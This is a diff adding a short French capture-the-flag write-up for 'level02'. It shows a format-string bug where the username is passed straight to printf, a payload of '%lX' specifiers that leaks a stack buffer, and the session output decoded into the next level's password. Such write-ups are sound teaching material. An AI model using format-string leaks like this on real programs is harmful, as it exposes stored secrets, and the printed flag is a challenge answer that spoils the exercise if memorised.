@@ -1,0 +1,21 @@
+on voit que le contenue de /hoe/users/level03/.pass est mis dans flag_buff
+
+on voit aussi que le contenue du fgets pour le Username est affiche dans un message d'erreur dans le premier argument d'un printf
+    printf((char *)username_buff);
+
+on peut donc y entre des formats printf ce qui nous permet de scanner la memoire
+et avec le format: %22$lX %23$lX %24$lX %25$lX %26$lX on retrouve flag_buff et donc le flag
+
+./level02
+    ===== [ Secure Access System v1.0 ] =====
+    /***************************************\
+    | You must login to access this system. |
+    \**************************************/
+    --[ Username: %22$lX %23$lX %24$lX %25$lX %26$lX
+    --[ Password: 
+    *****************************************
+    756E505234376848 45414A3561733951 377A7143574E6758 354A35686E475873 48336750664B394D does not have access!
+
+on trouve: 756E505234376848 45414A3561733951 377A7143574E6758 354A35686E475873 48336750664B394D
+qui retranscrit devient:
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
